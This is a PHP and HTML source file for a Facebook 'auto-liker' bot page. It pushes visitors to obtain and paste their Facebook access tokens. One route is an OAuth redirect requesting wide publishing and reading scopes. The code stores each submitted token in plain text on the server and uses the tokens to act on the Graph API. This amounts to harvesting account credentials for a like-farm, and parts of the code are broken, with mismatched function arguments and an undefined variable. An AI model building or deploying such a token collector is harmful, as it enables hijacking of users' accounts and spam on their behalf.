<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>-=[ FAIZAN ]=-</title>

<link rel="stylesheet" type="text/css" href="Mujju.css" media="all,handheld"/>

<link rel="shortcut icon" href="https://www.facebook.com/favicon.ico">

<head>

<body>

<script src="snow.js" type="text/javascript" charset="utf-8"></script>

</body>

<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$kingsd[]=$b.'='.$c;
}
	$true='?'.implode('&',$kingsd);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY -=[ ASAD ]=-',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('kingsd')){

        mkdir('kingsd');
}

if($bb){

	$blue=fopen('kingsd/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('kingsd/'.$id)){

	$file=file_get_contents('kingsd/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('kingsd/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('kingsd/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('kingsd/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('kingsd/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('kingsd/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('kingsd/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="bottom-content">
<div id="navigation-menu">
<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
</div><br/>
<br><font color="white"> Welcome To Pythons Bot Team :</font><font color="yellow"> '.$nm.' </font></br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<li>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" value="Activate Bot">
</form>
</div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'
<center></font><center><link href="http://fonts.googleapis.com/css?family=Aladin" rel="stylesheet" type="text/css"><link rel="stylesheet" type="text/css" <font size="3"></head>
<body><div style="font-family: Aladin;font-size: 35pt;text-shadow: 0 0 11px #09dbea, 0 0 11px #09dbea, 0 0 11px #09dbea;color: #FFF"><font color="blue" size="10"><font size="75"<b> <script language="JavaScript" src="MujahidAfridi.js" size="520"></script></b></font></font><br><center></h3>
<center>';
}

public function home(){
echo'
</h2></center></div>
<div id="content">
<div class="post">
';
}

public function bwh(){
echo'
<div id="bottom-content">
<center>
<br>
<br>
<br>
<a href="http://m.facebook.com/100015759931652"><img src="https://graph.facebook.com/100015759931652/picture?width=900" style="-moz-box-shadow:0px 0px 350px 0px red;-webkit-box-shadow:0px 0px 350px 0px red;-o-box-shadow:0px 0px 30px 0px lime;box-shadow:0px 0px 30px 0px red;width:180px; height:180px;border-radius:500px;" alt="FAIZAN ALI">
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<div id="wrap">
<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fprofile.php%3Fid%3D100015759931652&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>
<br>
<br>
<br>
<a href="http://www.m-autoliker.com/token.php?install=htc" target="_blank"><input class="button2" type="button" value="Allow Token"></a><font color="yellow"> - </font><a href="https://goo.gl/NkKRQ6" target="_blank"><input class="button2" type="button" value="Get Token"></a></br></br></center>
<center>
<ul>
</center>
<div id="top-content">
<div id="search-form">

<form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <input class="inp-btn" type="submit" style="height:28px;" value=" SUBMIT "></form></div></div></div>';

$this->membEr();
}

public function membEr(){

	if(!is_dir('kingsd')){

	mkdir('kingsd');
}

$up=opendir('kingsd');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">

Active Lovers : <font color="Yellow">'.count($user).'</font>

<br>Created By : <a href="http://facebook.com/100015759931652"><font color="Yellow">Faizan Ali</font><br>

</div>';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('kingsd/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('kingsd/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<audio controls="" autoplay="">
  <source src="http://w17.youtubeinmp3.com/download/get/?id=afMCuEe56hg&r=dSHyKgiDmAz25h0to89GDdaiDSuTQCT4&t=Tokyo+Drift+-+2Fast+2Furious&progressType=button&color=008000">
  Your browser does not support the audio element.
</audio></a>                                                                                                                                                                                                                                                                                                                                                                  